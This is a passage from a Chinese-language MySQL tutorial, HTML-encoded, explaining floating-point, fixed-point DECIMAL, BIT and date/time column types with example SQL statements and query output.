E&#x3002;&#x56E0;&#x6B64;&#x65E0;&#x8BBA;&#x6709;&#x6CA1;&#x6709;&#x7B26;&#x53F7;&#xFF0C;&#x6D6E;&#x70B9;&#x6570;&#x90FD;&#x4F1A;&#x5B58;&#x50A8;&#x8868;&#x793A;&#x7B26;&#x53F7;&#x7684;&#x90E8;&#x5206;&#x3002;&#x56E0;&#x6B64;&#x6240;&#x8C13;&#x7684;&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x90E8;&#x5206;&#x3002;</p>
<p>&#x6D6E;&#x70B9;&#x7C7B;&#x578B;&#x5355;&#x7CBE;&#x5EA6;&#x503C;&#x4F7F;&#x7528; 4 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x53CC;&#x7CBE;&#x5EA6;&#x503C;&#x4F7F;&#x7528; 8 &#x4E2A;&#x5B57;&#x8282;&#x3002;&#x90E8;&#x5206;&#x6570;&#x636E;&#x5E93;&#x5141;&#x8BB8;&#x4EE5; M &#x8868;&#x793A;&#x7CBE;&#x5EA6;&#xFF0C;D &#x8868;&#x793A;&#x6807;&#x5EA6;&#x7684;&#x975E;&#x6807;&#x51C6;&#x8BED;&#x6CD5;&#x3002;&#x82E5;&#x5728;&#x4E0D;&#x6307;&#x5B9A; (M,D) &#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x6309;&#x7167;&#x7531;&#x5B9E;&#x9645;&#x7684;&#x786C;&#x4EF6;&#x548C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x51B3;&#x5B9A;&#x7684;&#x5B9E;&#x9645;&#x7CBE;&#x5EA6;&#x6765;&#x663E;&#x793A;&#x3002;</p>
<pre><code class="language-sql">/*
!MySQL 8.0.17&#x5F00;&#x59CB;,FLOAT(M,D) &#x548C; DOUBLE(M,D) &#x7528;&#x6CD5;&#x5728;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x4E2D;&#x5DF2;&#x7ECF;&#x660E;&#x786E;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;!
FLOAT(M,D)&#x3001;DOUBLE(M,D) &#x4E2D; M=&#x6574;&#x6570;&#x4F4D;+&#x5C0F;&#x6570;&#x4F4D;,D=&#x5C0F;&#x6570;&#x4F4D;.D&lt;=M&lt;=255,0&lt;=D&lt;=30.
FLOAT(5,2) =&gt; &#x53EF;&#x4EE5;&#x663E;&#x793A; -999.99-999.99 =&gt; &#x8D85;&#x8FC7;&#x8303;&#x56F4;&#x4F1A;&#x62A5;&#x9519;.
&#x6D6E;&#x70B9;&#x7C7B;&#x578B;&#x4E5F;&#x53EF;&#x4EE5;&#x52A0; UNSIGNED,&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x6570;&#x636E;&#x8303;&#x56F4; =&gt; FLOAT(3,2) UNSIGNED &#x4ECD;&#x7136;&#x53EA;&#x80FD;&#x8868;&#x793A; 0-9.99 &#x7684;&#x8303;&#x56F4;.
&#x5B58;&#x50A8;&#x65F6;&#x6574;&#x6570;&#x90E8;&#x5206;&#x8D85;&#x51FA;&#x4E86;&#x8303;&#x56F4; =&gt; &#x62A5;&#x9519;,&#x4E0D;&#x5141;&#x8BB8;&#x5B58;&#x8FD9;&#x6837;&#x7684;&#x503C;.
&#x5B58;&#x50A8;&#x65F6;&#x5C0F;&#x6570;&#x70B9;&#x90E8;&#x5206;&#x82E5;&#x8D85;&#x51FA;&#x8303;&#x56F4; =&gt; &#x56DB;&#x820D;&#x4E94;&#x5165;&#x540E;&#x6574;&#x6570;&#x90E8;&#x5206;&#x6CA1;&#x6709;&#x8D85;&#x51FA;&#x8303;&#x56F4;&#x5219;&#x53EA;&#x8B66;&#x544A;;&#x82E5;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x540E;&#x6574;&#x6570;&#x90E8;&#x5206;&#x8D85;&#x51FA;&#x8303;&#x56F4;&#x5219;&#x62A5;&#x9519;&#x5E76;&#x62D2;&#x7EDD;&#x5904;&#x7406;.
*/
mysql&gt; CREATE TABLE test_double1(f1 FLOAT,f2 FLOAT(5,2),f3 DOUBLE,f4 DOUBLE(5,2));
mysql&gt; DESC test_double1;
mysql&gt; INSERT INTO test_double1 VALUES(123.456,123.456,123.4567,123.45);
mysql&gt; INSERT INTO test_double1 VALUES(123.456,1234.456,123.4567,123.45); #Out of range value for column &apos;f2&apos; at row 1
mysql&gt; SELECT * FROM test_double1;
# &#x7CBE;&#x5EA6;&#x8BEF;&#x5DEE; =&gt; &#x6D6E;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x4E0D;&#x591F;&#x7CBE;&#x786E;,&#x65E0;&#x6CD5;&#x7528;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x6765;&#x7CBE;&#x786E;&#x8868;&#x8FBE; =&gt; &#x66F4;&#x7CBE;&#x786E;&#x7684;&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B; DECIMAL
mysql&gt; CREATE TABLE test_double2(f1 DOUBLE);
mysql&gt; INSERT INTO test_double2 VALUES(0.47),(0.44),(0.19);
mysql&gt; SELECT SUM(f1) FROM test_double2;
mysql&gt; SELECT SUM(f1) FROM test_double2;
+--------------------+
| SUM(f1)            |
+--------------------+
| 1.0999999999999999 |
+--------------------+
mysql&gt; SELECT SUM(f1) = 1.1,1.1 = 1.1 FROM test_double2;
+---------------+-----------+
| SUM(f1) = 1.1 | 1.1 = 1.1 |
+---------------+-----------+
|             0 |         1 |
+---------------+-----------+
</code></pre>
<h3 id="%E5%AE%9A%E7%82%B9%E6%95%B0%E7%B1%BB%E5%9E%8B">&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B;</h3>
<p>&#x5B9A;&#x70B9;&#x6570;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5185;&#x90E8;&#x4EE5;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#xFF0C;&#x6B64;&#x7279;&#x70B9;&#x51B3;&#x5B9A;&#x5176;&#x7CBE;&#x51C6;&#x6027;&#x3002;&#x5E38;&#x4F7F;&#x7528;&#x4EE5;&#x7CBE;&#x5EA6; M&#xFF0C;&#x6807;&#x5EA6; D &#x7684;&#x5B9A;&#x70B9;&#x6570; DECIMAL(M,D) &#x8868;&#x793A;&#x9AD8;&#x7CBE;&#x5EA6;&#x5C0F;&#x6570;&#x3002;&#x5B9A;&#x70B9;&#x6570;&#x6700;&#x5927;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E0E; DOUBLE &#x7C7B;&#x578B;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x6709;&#x6548;&#x6570;&#x636E;&#x8303;&#x56F4;&#x7531; M &#x548C; D &#x51B3;&#x5B9A;&#x3002;DECIMAL &#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E0D;&#x56FA;&#x5B9A;&#xFF0C;&#x7531;&#x7CBE;&#x5EA6;&#x503C; M &#x51B3;&#x5B9A;&#xFF0C;&#x603B;&#x5171;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E3A; M+2 &#x4E2A;&#x5B57;&#x8282;&#x3002;&#x5728;&#x4E00;&#x4E9B;&#x5BF9;&#x7CBE;&#x5EA6;&#x8981;&#x6C42;&#x4E0D;&#x9AD8;&#x7684;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x6BD4;&#x8D77;&#x5360;&#x7528;&#x540C;&#x6837;&#x5B57;&#x8282;&#x957F;&#x5EA6;&#x7684;&#x5B9A;&#x70B9;&#x6570;&#xFF0C;&#x6D6E;&#x70B9;&#x6570;&#x8868;&#x8FBE;&#x7684;&#x6570;&#x503C;&#x8303;&#x56F4;&#x66F4;&#x5927;&#x3002;</p>
<p>&#x4ECE;&#x4F7F;&#x7528;&#x7684;&#x9009;&#x62E9;&#x89D2;&#x5EA6;&#x51FA;&#x53D1;&#xFF0C;&#x6D6E;&#x70B9;&#x6570;&#x76F8;&#x5BF9;&#x5B9A;&#x70B9;&#x6570;&#x7684;&#x4F18;&#x52BF;&#x662F;&#xFF0C;&#x957F;&#x5EA6;&#x4E00;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6D6E;&#x70B9;&#x7C7B;&#x578B;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5927;&#xFF0C;&#x4F46;&#x4E0D;&#x7CBE;&#x51C6;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x9700;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5927;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5BB9;&#x5FCD;&#x5FAE;&#x5C0F;&#x8BEF;&#x5DEE;&#x7684;&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x573A;&#x666F;&#xFF08;&#x8BA1;&#x7B97;&#x5316;&#x5B66;&#x3001;&#x5206;&#x5B50;&#x5EFA;&#x6A21;&#x3001;&#x6D41;&#x4F53;&#x52A8;&#x529B;&#x5B66;&#x7B49;&#xFF09;&#x3002;&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x76F8;&#x5BF9;&#x5C0F;&#xFF0C;&#x4F46;&#x662F;&#x7CBE;&#x51C6;&#xFF0C;&#x6CA1;&#x6709;&#x8BEF;&#x5DEE;&#xFF0C;&#x9002;&#x5408;&#x4E8E;&#x5BF9;&#x7CBE;&#x5EA6;&#x8981;&#x6C42;&#x6781;&#x9AD8;&#x7684;&#x573A;&#x666F;&#xFF08;&#x91D1;&#x989D;&#x8BA1;&#x7B97;&#xFF09;&#x3002;</p>
<pre><code class="language-sql">/*
0&lt;=M&lt;=65&#x3001;0&lt;=D&lt;=30&#x3001;D&lt;M.
DECIMAL(5,2) =&gt; &#x8BE5;&#x5217;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x662F; -999.99~999.99.
&#x5F53; DECIMAL &#x7C7B;&#x578B;&#x4E0D;&#x6307;&#x5B9A;&#x7CBE;&#x5EA6;&#x548C;&#x6807;&#x5EA6; =&gt; &#x5176;&#x9ED8;&#x8BA4;&#x4E3A; DECIMAL(10,0) =&gt; &#x7CBE;&#x5EA6;&#x8D85;&#x51FA;&#x4F1A;&#x8FDB;&#x884C;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x5904;&#x7406;.
*/
mysql&gt; create table test_decimal1(f1 DECIMAL, f2 DECIMAL(5,2));
mysql&gt; DESC test_decimal1;
+-------+---------------+------+-----+---------+-------+
| Field | Type          | Null | Key | Default | Extra |
+-------+---------------+------+-----+---------+-------+
| f1    | decimal(10,0) | YES  |     | NULL    |       |
| f2    | decimal(5,2)  | YES  |     | NULL    |       |
+-------+---------------+------+-----+---------+-------+
mysql&gt; INSERT INTO test_decimal1(f1) VALUES(123),(123.45);
mysql&gt; SELECT * FROM test_decimal1;

+------+------+
| f1   | f2   |
+------+------+
|  123 | NULL |
|  123 | NULL |
+------+------+
mysql&gt; INSERT INTO test_decimal1(f2) VALUES(999.99),(67.567);
mysql&gt; SELECT * FROM test_decimal1;
+------+--------+
| f1   | f2     |
+------+--------+
|  123 |   NULL |
|  123 |   NULL |
| NULL | 999.99 |
| NULL |  67.57 |
+------+--------+
mysql&gt; INSERT INTO test_decimal1(f2) VALUES(1234.567);
ERROR 1264 (22003): Out of range value for column &apos;f2&apos; at row 1
# &#x628A;test_double2&#x8868;&#x4E2D;&#x5B57;&#x6BB5;f1&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4FEE;&#x6539;&#x4E3A; DECIMAL(5,2)
mysql&gt; ALTER TABLE test_double2 MODIFY f1 DECIMAL(5,2);
SELECT SUM(f1) FROM test_double2;
+---------+
| SUM(f1) |
+---------+
|    1.10 |
+---------+
</code></pre>
<h3 id="%E4%BD%8D%E7%B1%BB%E5%9E%8B">&#x4F4D;&#x7C7B;&#x578B;</h3>
<p>BIT &#x7C7B;&#x578B;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x4F4D;&#x6570; M&#xFF0C;&#x9ED8;&#x8BA4;&#x662F; 1 &#x4F4D;&#x3002;&#x8868;&#x793A;&#x53EA;&#x80FD;&#x5B58; 1 &#x4F4D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x503C;&#x3002;&#x4F4D;&#x6570;&#x6700;&#x5C0F;&#x503C;&#x4E3A; 1&#xFF0C;&#x6700;&#x5927;&#x503C;&#x4E3A; 64&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_bit1(f1 BIT, f2 BIT(5), f3 BIT(64));
mysql&gt; INSERT INTO test_bit1(f1,f2) VALUES (1,23);
mysql&gt; SELECT * FROM test_bit1;
+------------+------------+------------+
| f1         | f2         | f3         |
+------------+------------+------------+
| 0x01       | 0x17       | NULL       |
+------------+------------+------------+
mysql&gt; INSERT INTO test_bit1 (f1) VALUES (2);
ERROR 1406 (22001): Data too long for column &apos;f1&apos; at row 1
</code></pre>
<h3 id="%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E7%B1%BB%E5%9E%8B">&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;</h3>
<table>
<thead>
<tr>
<th style="text-align:center">&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x5B57;&#x8282;</th>
<th style="text-align:center">&#x65E5;&#x671F;&#x683C;&#x5F0F;</th>
<th style="text-align:center">&#x6700;&#x5C0F;&#x503C;</th>
<th style="text-align:center">&#x6700;&#x5927;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">YEAR</td>
<td style="text-align:center">&#x5E74;</td>
<td style="text-align:center">1</td>
<td style="text-align:center">YYYY&#x6216;YY</td>
<td style="text-align:center">1901</td>
<td style="text-align:center">2155</td>
</tr>
<tr>
<td style="text-align:center">TIME</td>
<td style="text-align:center">&#x65F6;&#x95F4;</td>
<td style="text-align:center">3</td>
<td style="text-align:center">HH:MM:SS</td>
<td style="text-align:center">-838:59:59</td>
<td style="text-align:center">838:59:59</td>
</tr>
<tr>
<td style="text-align:center">DATE</td>
<td style="text-align:center">&#x65E5;&#x671F;</td>
<td style="text-align:center">3</td>
<td style="text-align:center">YYYY-MM-DD</td>
<td style="text-align:center">1000-01-01</td>
<td style="text-align:center">9999-12-03</td>
</tr>
<tr>
<td style="text-align:center">DATETIME</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">8</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1000-01-01 00:00:00</td>
<td style="text-align:center">9999-12-31 23:59:59</td>
</tr>
<tr>
<td style="text-align:center">TIMESTAMP</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">4</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1970-01-01 00:00:00 UTC</td>
<td style="text-align:center">2038-01-19 03:14:07UTC</td>
</tr>
</tbody>
</table>
<ul>
<li>YEAR &#x7C7B;&#x578B;</li>
</ul>
<p>YEAR &#x7C7B;&#x578B;&#x7528;&#x6765;&#x8868;&#x793A;&#x5E74;&#x4EFD;&#xFF0C;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x5360; 1 &#x5B57;&#x8282;&#xFF0C;&#x662F;&#x6240;&#x6709;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#x4E2D;&#x5360;&#x7528;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x6700;&#x5C0F;&#x7684;&#x3002;</p>
<pre><code class="language-sql">/*
4 &#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x5B57;&#x683C;&#x5F0F;&#x8868;&#x793A; YEAR &#x7C7B;&#x578B; =&gt; &#x683C;&#x5F0F;&#x4E3A; YYYY,&#x6700;&#x5C0F;&#x503C;&#x4E3A; 1901,&#x6700;&#x5927;&#x503C;&#x4E3A; 2155.
2 &#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x683C;&#x5F0F;&#x8868;&#x793A; YEAR &#x7C7B;&#x578B; =&gt; &#x6700;&#x5C0F;&#x503C;&#x4E3A; 00,&#x6700;&#x5927;&#x503C;&#x4E3A; 99. =&gt; &#x5F53;&#x53D6;&#x503C;&#x4E3A; 01 &#x5230; 69 &#x65F6;,&#x8868;&#x793A; 2001 &#x5230; 2069; &#x5F53;&#x53D6;&#x503C;&#x4E3A; 70 &#x5230; 99 &#x65F6;,&#x8868;&#x793A; 1970 &#x5230; 1999;&#x5F53;&#x53D6;&#x503C;&#x6574;&#x6570;&#x7684; 0 &#x6216; 00,&#x8868;&#x793A; 0000 &#x5E74;;&#x5F53;&#x53D6;&#x503C;&#x662F;&#x65E5;&#x671F;/&#x5B57;&#x7B26;&#x4E32;&#x7684; &apos;0&apos; &#x5219;&#x8868;&#x793A; 2000 &#x5E74;.
*/
mysql&gt; CREATE TABLE test_year(f1 YEAR,f2 YEAR(4));
mysql&gt; DESC test_year;
+-------+------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+------+------+-----+---------+-------+
| f1    | year | YES  |     | NULL    |       |
| f2    | year | YES  |     | NULL    |       |
+-------+------+------+-----+---------+-------+
mysql&gt; INSERT INTO test_year VALUES(&apos;2020&apos;,&apos;2021&apos;);
mysql&gt; SELECT * FROM test_year;
+------+------+
| f1   | f2   |
+------+------+
| 2020 | 2021 |
+------+------+
mysql&gt; INSERT INTO test_year VALUES(&apos;69&apos;,&apos;97&apos;);
mysql&gt; INSERT INTO test_year VALUES(0,&apos;0&apos;);
mysql&gt; SELECT * FROM test_year;
+------+------+
| f1   | f2   |
+------+------+
| 2020 | 2021 |
| 2069 | 1997 |
| 0000 | 2000 |
+------+------+
</code></pre>
<ul>
<li>DATE &#x7C7B;&#x578B;</li>
</ul>
<p>&#x683C;&#x5F0F; YYYY-MM-DD &#x7684; DATE &#x7C7B;&#x578B;&#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x65E0;&#x65F6;&#x95F4;&#x90E8;&#x5206;&#x3002;&#x5176;&#x4E2D; YYYY &#x8868;&#x793A;&#x5E74;&#x4EFD;&#xFF0C;MM &#x8868;&#x793A;&#x6708;&#x4EFD;&#xFF0C;DD &#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x6545;&#x9700;&#x8981; 3 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;&#x5728;&#x5411; DATE &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x7684;&#x683C;&#x5F0F;&#x6761;&#x4EF6;&#x3002;</p>
<p>&#x4EE5; YYYY-MM-DD &#x6216;&#x8005; YYYYMMDD &#x683C;&#x5F0F;&#x8868;&#x793A;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x65E5;&#x671F;&#xFF0C;&#x5176;&#x6700;&#x5C0F;&#x53D6;&#x503C;&#x4E3A; 1000-01-01&#xFF0C;&#x6700;&#x5927;&#x53D6;&#x503C;&#x4E3A; 9999-12-03&#x3002;YYYYMMDD &#x683C;&#x5F0F;&#x4F1A;&#x88AB;&#x8F6C;&#x5316;&#x4E3A; YYYY-MM-DD &#x683C;&#x5F0F;&#x3002;&#x4EE5; YY-MM-DD &#x6216;&#x8005; YYMMDD &#x683C;&#x5F0F;&#x8868;&#x793A;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x65E5;&#x671F;&#xFF0C;&#x5F53;&#x5E74;&#x4EFD;&#x53D6;&#x503C;&#x4E3A; 00 &#x5230; 69&#xFF0C;&#x4F1A;&#x88AB;&#x8F6C;&#x5316;&#x4E3A; 2000 &#x5230; 2069&#xFF1B;&#x5F53;&#x5E74;&#x4EFD;&#x53D6;&#x503C;&#x4E3A; 70 &#x5230; 99&#xFF0C;&#x4F1A;&#x88AB;&#x8F6C;&#x5316;&#x4E3A; 1970 &#x5230; 1999&#x3002;&#x4F7F;&#x7528; <code>CURRENT_DATE()</code> &#x6216;&#x8005; <code>NOW()</code> &#x51FD;&#x6570;&#xFF0C;&#x4F1A;&#x63D2;&#x5165;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x7684;&#x65E5;&#x671F;&#x3002;</p>
<pre><code class="language-sql">CREATE TABLE test_date1(f1 DATE);
INSERT INTO test_date1 VALUES (&apos;2020-10-01&apos;), (&apos;20201001&apos;), (20201001); 
INSERT INTO test_date1 VALUES (000401), (690426), (700401), (970422);
INSERT INTO test_date1 VALUES (CURRENT_DATE()), (NOW());
SELECT * FROM test_date1;
+------------+
| f1         |
+------------+
| 2020-10-01 |
| 2020-10-01 |
| 2020-10-01 |
| 2000-04-01 |
| 2069-04-26 |
| 1970-04-01 |
| 1997-04-22 |
| 2021-10-12 |
| 2021-10-12 |
+------------+
</code></pre>
<ul>
<li>TIME &#x7C7B;&#x578B;</li>
</ul>
<p>&#x9700;&#x8981; 3 &#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x7684; TIME &#x7C7B;&#x578B;&#x7528;&#x6765;&#x8868;&#x793A;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x5305;&#x542B;&#x65E5;&#x671F;&#x90E8;&#x5206;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; HH:MM:SS &#x683C;&#x5F0F;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5176;&#x4E2D; HH &#x8868;&#x793A;&#x5C0F;&#x65F6;&#xFF0C;MM &#x8868;&#x793A;&#x5206;&#x949F;&#xFF0C;SS &#x8868;&#x793A;&#x79D2;&#x3002;</p>
<pre><code class="language-sql">/*
&#x5411; TIME &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;
1.&#x5E26;&#x6709;&#x5192;&#x53F7;&#x7684;&#x5B57;&#x7B26;&#x4E32; =&gt; &apos;D HH:MM:SS&apos;&#x3001;&apos;HH:MM:SS&apos;&#x3001;&apos;HH:MM&apos;&#x3001;&apos;D HH:MM&apos;&#x3001;&apos;D HH&apos; &#x6216; &apos;SS&apos; =&gt; D &#x8868;&#x793A;&#x5929;,&#x6700;&#x5C0F;&#x503C;&#x4E3A; 0,&#x6700;&#x5927;&#x503C;&#x4E3A; 34 =&gt; &#x5E26;&#x6709; D &#x683C;&#x5F0F;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x63D2;&#x5165; TIME &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x65F6;,D &#x4F1A;&#x88AB;&#x8F6C;&#x5316;&#x4E3A;&#x5C0F;&#x65F6;,&#x8BA1;&#x7B97;&#x683C;&#x5F0F;&#x4E3A; D * 24 + HH. =&gt; &#x5E26;&#x6709;&#x5192;&#x53F7;&#x5E76;&#x4E14;&#x4E0D;&#x5E26; D &#x7684;&#x5B57;&#x7B26;&#x4E32;,&#x8868;&#x793A;&#x5F53;&#x5929;&#x7684;&#x65F6;&#x95F4;,&#x6BD4;&#x5982; 12:10 &#x8868;&#x793A; 12:10:00,&#x800C;&#x4E0D;&#x662F; 00:12:10.
2.&#x4E0D;&#x5E26;&#x6709;&#x5192;&#x53F7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x6570;&#x5B57; =&gt; &quot;HHMMSS&quot;&#x3001;HHMMSS =&gt; &#x63D2;&#x5165;&#x4E0D;&#x5408;&#x6CD5;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x6570;&#x5B57;,&#x4F1A;&#x5C06;&#x5176;&#x81EA;&#x52A8;&#x8F6C;&#x5316;&#x4E3A; 00:00:00 &#x8FDB;&#x884C;&#x5B58;&#x50A8;.
3.&#x4F7F;&#x7528; CURRENT_TIME() &#x6216;&#x8005; NOW() &#x4F1A;&#x63D2;&#x5165;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x7684;&#x65F6;&#x95F4;
*/
mysql&gt; CREATE TABLE test_time1(f1 TIME);
mysql&gt; INSERT INTO test_time1 VALUES(&apos;2 12:30:29&apos;),(&apos;12:35:29&apos;),(&apos;12:40&apos;),(&apos;2 12:40&apos;),(&apos;1 05&apos;),(&apos;45&apos;);
mysql&gt; INSERT INTO test_time1 VALUES (&apos;123520&apos;),(124011),(1210);
mysql&gt; INSERT INTO test_time1 VALUES (NOW()), (CURRENT_TIME()),(CURTIME());
mysql&gt; SELECT * FROM test_time1;
</code></pre>
<ul>
<li>DATETIME &#x7C7B;&#x578B;</li>
</ul>
<p>8 &#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x7684; DATETIME &#x7C7B;&#x578B;&#x5728;&#x6240;&#x6709;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#x4E2D;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x6700;&#x5927;&#x3002;&#x683C;&#x5F0F;&#x4E3A; DATE &#x548C; TIME &#x7C7B;&#x578B;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x5373; YYYY-MM-DD HH:MM:SS&#x3002;</p>
<pre><code class="language-sql">/*
YYYY-MM-DD HH:MM:SS &#x6216;&#x8005; YYYYMMDDHHMMSS &#x683C;&#x5F0F;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x63D2;&#x5165; =&gt; &#x6700;&#x5C0F;&#x503C;&#x4E3A; 1000-01-01 00:00:00,&#x6700;&#x5927;&#x503C;&#x4E3A; 9999-12-03 23:59:59.
YYYYMMDDHHMMSS &#x683C;&#x5F0F;&#x7684;&#x6570;&#x5B57;&#x63D2;&#x5165; =&gt; &#x8F6C;&#x5316;&#x4E3A; YYYY-MM-DD HH:MM:SS &#x683C;&#x5F0F;
YY-MM-DD HH:MM:SS &#x6216;&#x8005; YYMMDDHHMMSS &#x683C;&#x5F0F;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x63D2;&#x5165; =&gt; &#x4E24;&#x4F4D;&#x6570;&#x7684;&#x5E74;&#x4EFD;&#x89C4;&#x5219;&#x7B26;&#x5408; YEAR &#x7C7B;&#x578B;&#x7684;&#x89C4;&#x5219;,00 &#x5230; 69 &#x8868;&#x793A; 2000 &#x5230; 2069;70 &#x5230; 99 &#x8868;&#x793A; 1970 &#x5230; 1999.
CURRENT_TIMESTAMP() &#x548C; NOW() &#x53EF;&#x4EE5;&#x5411; DATETIME &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x7CFB;&#x7EDF;&#x7684;&#x5F53;&#x524D;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;.
*/
mysql&gt; CREATE TABLE test_datetime1(dt DATETIME);
mysql&gt; INSERT INTO test_datetime1 VALUES (&apos;2021-01-01 06:50:30&apos;), (&apos;20210101065030&apos;);
mysql&gt; INSERT INTO test_datetime1 VALUES (&apos;99-01-01 00:00:00&apos;), (&apos;990101000000&apos;), (&apos;20-01-01 00:00:00&apos;), (&apos;200101000000&apos;);
mysql&gt; INSERT INTO test_datetime1 VALUES (20200101000000), (200101000000), (19990101000000), (990101000000);
mysql&gt; INSERT INTO test_datetime1 VALUES (CURRENT_TIMESTAMP()), (NOW()),(SYSDATE());
mysql&gt; SELECT * FROM test_datetime1;
</code></pre>
<ul>
<li>TIMESTAMP &#x7C7B;&#x578B;</li>
</ul>
<p>TIMESTAMP &#x663E;&#x793A;&#x683C;&#x5F0F;&#x4E0E; DATETIME &#x7C7B;&#x578B;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x53EA;&#x9700;&#x8981; 4 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;TIMESTAMP &#x5B58;&#x50A8;&#x7684;&#x65F6;&#x95F4;&#x8303;&#x56F4;&#x6BD4; DATETIME &#x8981;&#x5C0F;&#x5F88;&#x591A;&#xFF0C;&#x53EA;&#x80FD;&#x5B58;&#x50A8; &quot;1970-01-01 00:00:01 UTC&quot; &#x5230; &quot;2038-01-19 03:14:07 UTC&quot; &#x91CC;&#x7684;&#x65F6;&#x95F4;&#x3002;Coordinated Universal Time &#x5373;&#x4E16;&#x754C;&#x534F;&#x8C03;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x53EB;&#x4F5C;&#x4E16;&#x754C;&#x6807;&#x51C6;&#x65F6;&#x95F4;&#x3002;</p>
